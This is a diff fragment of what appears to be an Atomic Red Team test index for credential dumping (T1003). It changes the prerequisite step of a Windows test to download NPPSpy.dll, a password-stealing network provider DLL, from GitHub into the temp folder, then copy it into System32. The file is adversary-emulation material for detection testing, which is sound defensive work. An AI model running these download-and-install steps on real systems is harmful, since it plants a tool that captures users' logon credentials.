@@ -19629,12 +19629,11 @@ credential-access:
       - windows
       dependency_executor_name: powershell
       dependencies:
-      - description: NPPSpy.dll must exist in PathToAtomicsFolder\T1003\bin directory
-        prereq_command: if (Test-Path "PathToAtomicsFolder\T1003\bin\NPPSpy.dll")
-          {exit 0} else {exit 1}
-        get_prereq_command: |-
-          $rv = mkdir PathToAtomicsFolder\T1003\bin
-          Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile "PathToAtomicsFolder\T1003\bin\NPPSpy.dll"
+      - description: NPPSpy.dll must be available in local temp directory
+        prereq_command: if (Test-Path "$env:Temp\NPPSPY.dll") {exit 0} else {exit
+          1}
+        get_prereq_command: Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll
+          -OutFile "$env:Temp\NPPSPY.dll"
       executor:
         command: |-
           Copy-Item "$env:Temp\NPPSPY.dll" -Destination "C:\Windows\System32"
